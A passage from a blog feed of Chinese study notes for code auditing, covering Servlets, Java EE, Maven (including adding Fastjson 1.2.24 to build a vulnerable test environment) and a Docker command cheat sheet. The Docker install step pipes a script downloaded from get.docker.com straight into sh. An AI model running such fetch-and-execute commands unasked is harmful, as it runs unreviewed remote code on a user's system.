class-name">AnnotationServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">doPost</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.0 Transitional//EN'>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;HTML>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;HEAD>&lt;TITLE> ITBZ &lt;/TITLE>&lt;/HEAD>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;BODY>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Annotation Servlet!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;/BODY>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;/HTML>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注解参数</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111151656906.png"></p><p>通过图中的「等价于 web.xml 的标签」一栏可以看出，web.xml 可以配置的 Servlet 属性都可以通过 @WebServlet 的方式进行配置。</p><h1 id="0x02-Servlet-的访问流程"><a href="#0x02-Servlet-的访问流程" class="headerlink" title="0x02 Servlet 的访问流程"></a>0x02 Servlet 的访问流程</h1><p>以上文中的 web.xml 配置文件为例，其访问流程如下所示。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111151656655.png"></p><p>首先用户在浏览器里输入URL，然后浏览器发起请求，服务器通过 servlet-mapping 标签找到文件名为 user 的 url-pattern，通过其对应的 servlet-name 寻找 servlet 标签中 servlet-name 相同的 servlet，再获取其 servlet 标签里的 servlet-class 参数，最后得到具体的 class 文件路径，从而执行相关文件。</p><h1 id="0x03-Servlet-的接口方法"><a href="#0x03-Servlet-的接口方法" class="headerlink" title="0x03 Servlet 的接口方法"></a>0x03 Servlet 的接口方法</h1><h2 id="1、init-接口"><a href="#1、init-接口" class="headerlink" title="1、init() 接口"></a>1、init() 接口</h2><p>在 Servlet 实例化后，Servlet 容器会调用 init() 方法来初始化该对象，主要是为了让 Servlet 对象在处理客户请求前可以完成一些初始化的工作，例如建立数据库连接，获取配置信息等。</p><p>对于每一个 Servlet 实例，init() 方法只能被调用一次。</p><p>init() 方法的定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 开发者自定义代码</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2、service-接口"><a href="#2、service-接口" class="headerlink" title="2、service() 接口"></a>2、service() 接口</h2><p>service() 方法是执行实际任务的主要方法，Servlet 容器调用 service() 方法来处理来自客户端（浏览器）的请求，并将格式化的响应写回客户端，每次服务器接收到一个 Servlet 请求时，服务器都会产生一个新的线程并调用服务。</p><p>值得注意的是，在 service() 方法被容器调用之前，必须确保 init() 方法正确完成。</p><p>service() 方法的定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> service <span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span><span class="token class-name">ServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span><span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>     <span class="token comment">// 开发者自定义代码</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3、doGet-doPost-等接口"><a href="#3、doGet-doPost-等接口" class="headerlink" title="3、doGet() / doPost() 等接口"></a>3、doGet() / doPost() 等接口</h2><p>doGet() 等方法需要根据 HTTP 的不同请求调用不同的方法，如果 HTTP 得到一个来自 URL 的 GET 请求，就会调用 doGet() 方法，同样的，如果得到 POST 请求，就会调用 doPost() 方法。</p><p>这类方法的定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span><span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span><span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 开发者自定义代码</span>    <span class="token comment">// 如果是 POST 请求，则调用 public void doPost 方法</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4、destroy-接口"><a href="#4、destroy-接口" class="headerlink" title="4、destroy() 接口"></a>4、destroy() 接口</h2><p>当容器检测到一个 Servlet 对象应该从服务中被移除的时候，容器会调用该对象的 destroy() 方法，以便让 Servlet 对象可以释放它所使用的资源，保存数据到持久存储设备中，例如将内存中的数据保存到数据库中，关闭数据库的连接等。</p><p>destroy() 方法与 init() 方法相同，都只会调用一次。</p><p>destroy() 方法定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 开发者自定义代码</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="5、getServletConfig-接口"><a href="#5、getServletConfig-接口" class="headerlink" title="5、getServletConfig() 接口"></a>5、getServletConfig() 接口</h2><p>该方法返回容器调用 init() 方法时传递给 Servlet 对象的 ServletConfig 对象，ServletConfig 对象包含了 Servlet 的初始化参数。</p><h2 id="6、getServletInfo-接口"><a href="#6、getServletInfo-接口" class="headerlink" title="6、getServletInfo() 接口"></a>6、getServletInfo() 接口</h2><p>该方法返回一个 String 类型的字符串，其中包括了关于 Servlet 的信息，例如，作者、版本和版权等。</p><h1 id="0x04-Servlet-的生命周期"><a href="#0x04-Servlet-的生命周期" class="headerlink" title="0x04 Servlet 的生命周期"></a>0x04 Servlet 的生命周期</h1><p>Servlet 生命周期指的是 Servlet 从创建直到销毁的整个过程。</p><p>在一个生命周期中，Servlet 经历了被加载、初始化、接收请求、响应请求以及提供服务的过程，具体如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111151656032.png"></p><blockquote><p>参考链接：</p><p><a href="https://tomcat.apache.org/whichversion.html">https://tomcat.apache.org/whichversion.html</a></p><p><a href="https://blog.csdn.net/bieleyang/article/details/76696131">https://blog.csdn.net/bieleyang/article/details/76696131</a></p><p><a href="https://blog.csdn.net/qq_45017999/article/details/106696148">https://blog.csdn.net/qq_45017999/article/details/106696148</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;Servlet 是 Java Web 容器中运行的小程序，Servlet 原则上可以通过任何客户端-</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】Java EE 基础知识</title>
    <link href="https://www.teamssix.com/211115-123451.html"/>
    <id>https://www.teamssix.com/211115-123451.html</id>
    <published>2021-11-15T04:34:51.000Z</published>
    <updated>2021-11-22T08:59:49.391Z</updated>
    
    <content type="html"><![CDATA[<p>Java 平台分为三个主要版本：</p><ol><li>Java SE（Java 平台标准版）</li><li>Java EE（Java 平台企业版）</li><li>Java ME（Java 平台微型版）</li></ol><p>Java EE 是 Java 应用最广泛的版本。</p><h1 id="0x01-Java-EE-的核心技术"><a href="#0x01-Java-EE-的核心技术" class="headerlink" title="0x01 Java EE 的核心技术"></a>0x01 Java EE 的核心技术</h1><p>Java EE 有十三种核心技术，它们分别是：JDBC、JNDI、EJB、RMI、Servlet、JSP、XML、JMS、Java IDL、JTS、JTA、JavaMail 和 JAF，这里重点介绍以下几种：</p><ol><li>Java 数据库连接（Java Database Connectivity，JDBC）是 Java 语言中用来规范客户端程序如何来访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法。</li><li>Java 命名和目录接口（Java Naming and Directory Interface，JNDI），是 Java 的一个目录服务应用程序界面（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。简单的说就是比如以前连接数据库需要把参数写在 Java 类里，但现在可以直接写在配置文件里了，这个配置文件可以是 XML，也可以是 properties，或者 yml 文件，只要能解析都行。</li><li>企业级 JavaBean（Enterprise JavaBean, EJB）是一个用来构筑企业级应用的、在服务器端可被管理组件。不过这个东西在 Spring 问世后基本凉凉了，知道是什么就行。</li><li>远程方法调用（Remote Method Invocation，RMI）是 Java 的一组拥有开发分布式应用程序的 API，它大大增强了 Java 开发分布式应用的能力。</li><li>Servlet（Server Applet），是用 Java 编写的服务端程序。其主要功能在于交互式地浏览和修改数据，生成动态 Web 内容。狭义的 Servlet 是指 Java 语言实现的一个接口，广义的 Servlet 是指任何实现了这个 Servlet 接口的类，一般情况下，人们将 Servlet 理解为后者。</li><li>JSP（全称 JavaServer Pages）是由 Sun 公司主导创建的一种动态网页技术标准。JSP 部署于网络服务器上，可以响应客户端发送的请求，并根据请求内容动态地生成 HTML、XML 或其他格式文档的 Web 网页，然后返回给请求者。</li><li>可扩展标记语言（eXtensible Markup Language，XML）是被设计用于传输和存储数据的语言。</li><li>Java 服务消息（Java Message Service，JMS）是一个 Java 平台中关于面向消息中间件（MOM）的 API，用于在两个应用程序之间或分布式系统中发送消息，进行异步通信。</li></ol><h1 id="0x02-Java-EE-分层模型"><a href="#0x02-Java-EE-分层模型" class="headerlink" title="0x02 Java EE 分层模型"></a>0x02 Java EE 分层模型</h1><p>Java EE 应用的分层模型主要分为以下 5 层。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/img/202111151127644.png"></p><ol><li>Domain Object（领域对象）层，也叫模型（Modole）层，此层由一系列的 POJO（Plain Old Java Object，普通的、传统的 java 对象）组成，这些对象是该系统的 Domain Object，往往包含了各自所需实现的业务逻辑方法。</li><li>DAO（Data Access Object，数据访问对象）层，此层由一系列的 DAO 组件组成，这些 DAO 实现了对数据库的创建、查询、更新和删除（CRUD）等原子操作。</li><li>Service（业务逻辑层）层，此层由一系列的业务逻辑对象组成，这些业务逻辑对象实现了系统所需要的业务逻辑方法。这些业务逻辑方法可能仅仅用于暴露Domain Object 对象所实现的业务逻辑方法，也可能是依赖 DAO 组件实现的业务逻辑方法。</li><li>Controller（控制器）层，此层由一系列控制器组成，这些控制器用于拦截用户请求，并调用业务逻辑组件的业务逻辑方法，并根据处理结果转发到不同的 View 组件。</li><li>View（表现）层，此层由一系列的 JSP 页面、Velocity 页面、PDF 文档视图组件组成，负责收集用户请求，并显示处理后的结果。</li></ol><blockquote><p>参考链接：</p><p><a href="https://zhuanlan.zhihu.com/p/43884237">https://zhuanlan.zhihu.com/p/43884237</a></p><p><a href="https://www.codenong.com/cs105259462/">https://www.codenong.com/cs105259462/</a></p><p><a href="https://blog.csdn.net/mzc_love/article/details/107244053">https://blog.csdn.net/mzc_love/article/details/107244053</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Java 平台分为三个主要版本：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Java SE（Java 平台标准版）&lt;/li&gt;
&lt;li&gt;Java EE（Java 平台企业版）&lt;/li&gt;
&lt;li&gt;Java ME（Java 平台微型版）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Java EE 是 Java </summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】Maven 基础知识</title>
    <link href="https://www.teamssix.com/211103-161807.html"/>
    <id>https://www.teamssix.com/211103-161807.html</id>
    <published>2021-11-03T08:18:07.000Z</published>
    <updated>2021-11-22T08:59:50.276Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Maven 是一个项目构建和管理工具，利用它可以对 JAVA 项目进行构建和管理。</p><p>Maven 采用项目对象模型 POM（Project Object Model）来管理项目。</p><p>Maven 的主要工作就是用来解析一些 XML 文档、管理生命周期与插件。</p><p>Maven 被设计成将主要的职责委派给一组 Maven 插件，这些插件可以影响 Maven 生命周期，提供对目标的访问。</p><h2 id="0x01-pom-xml-文件介绍"><a href="#0x01-pom-xml-文件介绍" class="headerlink" title="0x01 pom.xml 文件介绍"></a>0x01 pom.xml 文件介绍</h2><p>pom.xml 文件被用于管理源代码、配置文件、开发者的信息和角色等，Maven 项目中可以没有其他文件但必须包含 pom.xml 文件，该文件也是 Maven 项目的核心配置文件。</p><p>一个引入 Fastjson 1.2.24 版本组件的配置信息如下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependencies&gt;  &lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;com.alibaba&#x2F;fastjson --&gt;  &lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;    &lt;version&gt;1.2.24&lt;&#x2F;version&gt;  &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>该配置信息可直接从 <a href="https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24">https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24</a> 获得</p></blockquote><p>配置文件里的 dependencies 和 dependency 用于定义依赖关系，dependency 里的 groupId、artifactId、version 用来定义所依赖的项目。</p><h1 id="0x02-Maven-的使用"><a href="#0x02-Maven-的使用" class="headerlink" title="0x02 Maven 的使用"></a>0x02 Maven 的使用</h1><p>这里以 IntelliJ IDEA 为例，在新建项目时选择创建 Maven 项目即可。</p><p>在创建完 Maven 项目后，就会看到项目里包含的 pox.xml 文件了，对于安全人员就可以通过该文件去判断当前项目里是否包含了存在隐患的组件。</p><p>这时如果想搭建一个 Fastjson &lt;= 1.2.24 版本的漏洞环境，就需要将 Fastjson &lt;= 1.2.24 版本的组件引入。</p><p>这里只需要把上面的配置信息复制到 pom.xml 文件中，然后右击 pom.xml 文件选择「Maven」–「重新加载项目」，就可以自动进行组件的获取了。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111031614583.png"></p><p>稍后等组件被自动下载到本地并自动加入到项目依赖中后，就可以在项目代码使用该组件了。</p><blockquote><p>参考文章：</p><p><a href="https://www.jianshu.com/p/43ed2e9e386b">https://www.jianshu.com/p/43ed2e9e386b</a></p><p><a href="https://www.cnblogs.com/bndong/p/9762067.html">https://www.cnblogs.com/bndong/p/9762067.html</a></p><p><a href="https://www.cnblogs.com/cainiaomahua/p/10651014.html">https://www.cnblogs.com/cainiaomahua/p/10651014.html</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;Maven 是一个项目构建和管理工具，利用它可以对 JAVA 项目进行构建和管理。&lt;/p&gt;
&lt;p&gt;M</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【经验总结】Docker 使用笔记</title>
    <link href="https://www.teamssix.com/211028-204606.html"/>
    <id>https://www.teamssix.com/211028-204606.html</id>
    <published>2021-10-28T12:46:06.000Z</published>
    <updated>2021-11-22T08:59:50.297Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>平时在使用 Docker 时，经常会碰到忘记相关命令的情况，因此平时忘记一个就会记录一个，经过多年的记录，Docker 相关的笔记已经记录了不少。</p><p>最近在看代码审计的时候又提到了 Docker，正好借着这个机会好好的把原来记录的比较乱的 Docker 笔记整理一下。</p><p>如果你也面临过「在使用 Docker 时，时不时就会忘记某条命令」的情况，那么我相信本篇文章应该会对你有所帮助。</p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><h2 id="1、安装-Docker"><a href="#1、安装-Docker" class="headerlink" title="1、安装 Docker"></a>1、安装 Docker</h2><pre class="line-numbers language-none"><code class="language-none">curl -fsSL https:&#x2F;&#x2F;get.docker.com&#x2F; | sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-none"><code class="language-none">wget -qO- https:&#x2F;&#x2F;get.docker.com&#x2F; | sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在命令中输入以下命令，如果输出 helloword 表示 Docker 安装成功。</p><pre class="line-numbers language-none"><code class="language-none">docker run ubuntu echo &quot;helloworld&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110282041924.png"></p><h2 id="2、安装-Docker-Compose"><a href="#2、安装-Docker-Compose" class="headerlink" title="2、安装 Docker-Compose"></a>2、安装 Docker-Compose</h2><pre class="line-numbers language-none"><code class="language-none">sudo curl -L &quot;https:&#x2F;&#x2F;github.com&#x2F;docker&#x2F;compose&#x2F;releases&#x2F;download&#x2F;1.23.2&#x2F;docker-compose-$(uname -s)-$(uname -m)&quot; -o &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-composesudo chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-composedocker-compose --version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3、Docker-设置国内镜像源"><a href="#3、Docker-设置国内镜像源" class="headerlink" title="3、Docker 设置国内镜像源"></a>3、Docker 设置国内镜像源</h2><pre class="line-numbers language-none"><code class="language-none">vi &#x2F;etc&#x2F;docker&#x2F;daemon.json&#123;    &quot;registry-mirrors&quot;: [&quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;]&#125;systemctl restart docker.service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>国内加速地址如下：</p><pre class="line-numbers language-none"><code class="language-none">Docker中国区官方镜像https:&#x2F;&#x2F;registry.docker-cn.com网易http:&#x2F;&#x2F;hub-mirror.c.163.com中国科技大学https:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn阿里云容器  服务https:&#x2F;&#x2F;cr.console.aliyun.com&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h1><h2 id="1、搜索镜像"><a href="#1、搜索镜像" class="headerlink" title="1、搜索镜像"></a>1、搜索镜像</h2><pre class="line-numbers language-none"><code class="language-none">docker search centos<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、拉取镜像"><a href="#2、拉取镜像" class="headerlink" title="2、拉取镜像"></a>2、拉取镜像</h2><pre class="line-numbers language-none"><code class="language-none">docker pull centos<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、查看镜像文件"><a href="#3、查看镜像文件" class="headerlink" title="3、查看镜像文件"></a>3、查看镜像文件</h2><pre class="line-numbers language-none"><code class="language-none">docker images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看镜像层级关系</p><pre class="line-numbers language-none"><code class="language-none">docker images tree# 以前这个命令是：docker images --tree<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4、查看docker所有进程"><a href="#4、查看docker所有进程" class="headerlink" title="4、查看docker所有进程"></a>4、查看docker所有进程</h2><pre class="line-numbers language-none"><code class="language-none">docker ps -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5、开启容器"><a href="#5、开启容器" class="headerlink" title="5、开启容器"></a>5、开启容器</h2><p>开启指定容器，这里的容器名为 Web</p><pre class="line-numbers language-none"><code class="language-none">docker start web<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动所有容器</p><pre class="line-numbers language-none"><code class="language-none">docker start $(docker ps -aq)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6、进入正在运行的容器"><a href="#6、进入正在运行的容器" class="headerlink" title="6、进入正在运行的容器"></a>6、进入正在运行的容器</h2><p>docker 创建的</p><pre class="line-numbers language-none"><code class="language-none">docker attach web<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>docker-compose 创建的</p><p>container_name 需要在 docker-compose.yml 文件中查看</p><pre class="line-numbers language-none"><code class="language-none">docker-compose exec container_name bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="7、指定端口启动创建进入容器"><a href="#7、指定端口启动创建进入容器" class="headerlink" title="7、指定端口启动创建进入容器"></a>7、指定端口启动创建进入容器</h2><pre class="line-numbers language-none"><code class="language-none">docker run -p 9992:80 -p 8882:8888 -it ubuntu &#x2F;bin&#x2F;bashdocker run --name web1 -p 9991:80 -p 8881:8888 -it centos &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="8、导出导入镜像"><a href="#8、导出导入镜像" class="headerlink" title="8、导出导入镜像"></a>8、导出导入镜像</h2><p>export\import 导入导出</p><pre class="line-numbers language-none"><code class="language-none">docker export web &gt; &#x2F;home&#x2F;docker_web.tardocker import &#x2F;home&#x2F;docker_web.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>save\load 导入导出</p><pre class="line-numbers language-none"><code class="language-none">docker save 9610cfc68e8d &gt; &#x2F;home&#x2F;docker_web.tardocker load &lt; &#x2F;home&#x2F;docker_web.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>export\import 与 save\load 的区别：</p><ul><li><p>export\import 导出的镜像文件大小要小于 save\load 导出的镜像</p></li><li><p>export\import 是根据容器拿到的镜像，再导入时会丢失镜像所有的历史，所以无法进行回滚操作；而 save\load 的镜像，没有丢失镜像的历史，可以回滚到之前的层。</p></li></ul><h2 id="9、修改正在运行的容器端口映射"><a href="#9、修改正在运行的容器端口映射" class="headerlink" title="9、修改正在运行的容器端口映射"></a>9、修改正在运行的容器端口映射</h2><p>a、停止容器</p><p>b、 停止 docker 服务(systemctl stop docker) </p><p>c、 修改这个容器的 hostconfig.json 文件中的端口（原帖有人提到，如果 config.v2.json 里面也记录了端口，也要修改） </p><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;var&#x2F;lib&#x2F;docker&#x2F;3b6ef264a040* # 这里是 CONTAINER IDvi hostconfig.json# 如果之前没有端口映射, 应该有这样的一段:&quot;PortBindings&quot;:&#123;&#125;# 增加一个映射, 这样写:&quot;PortBindings&quot;:&#123;&quot;3306&#x2F;tcp&quot;:[&#123;&quot;HostIp&quot;:&quot;&quot;,&quot;HostPort&quot;:&quot;3307&quot;&#125;]&#125;# 前一个数字是容器端口, 后一个是宿主机端口# 而修改现有端口映射更简单, 把端口号改掉就行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>d、启动docker服务(systemctl start docker)</p><p>e、启动容器</p><h2 id="10、文件传输"><a href="#10、文件传输" class="headerlink" title="10、文件传输"></a>10、文件传输</h2><pre class="line-numbers language-none"><code class="language-none">docker cp 本地文件路径 ID全称:容器路径# 或者docker cp ID全称:容器文件路径 本地路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="11、后台运行docker"><a href="#11、后台运行docker" class="headerlink" title="11、后台运行docker"></a>11、后台运行docker</h2><p>启动全新的容器，该命令会在后台运行容器，并返回容器ID</p><pre class="line-numbers language-none"><code class="language-none">docker run -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对于现有的容器</p><pre class="line-numbers language-none"><code class="language-none">ctrl+P+Q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x03-卸载"><a href="#0x03-卸载" class="headerlink" title="0x03 卸载"></a>0x03 卸载</h1><h2 id="1、停止容器"><a href="#1、停止容器" class="headerlink" title="1、停止容器"></a>1、停止容器</h2><p>停止指定容器</p><pre class="line-numbers language-none"><code class="language-none">docker stop web<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>停止所有容器</p><pre class="line-numbers language-none"><code class="language-none">docker stop $(docker ps -aq)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、删除容器和镜像"><a href="#2、删除容器和镜像" class="headerlink" title="2、删除容器和镜像"></a>2、删除容器和镜像</h2><p>删除指定容器</p><pre class="line-numbers language-none"><code class="language-none">docker container rm d383057928b4# 指定容器 ID<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除所有已退出的容器</p><pre class="line-numbers language-none"><code class="language-none">docker rm $(docker ps 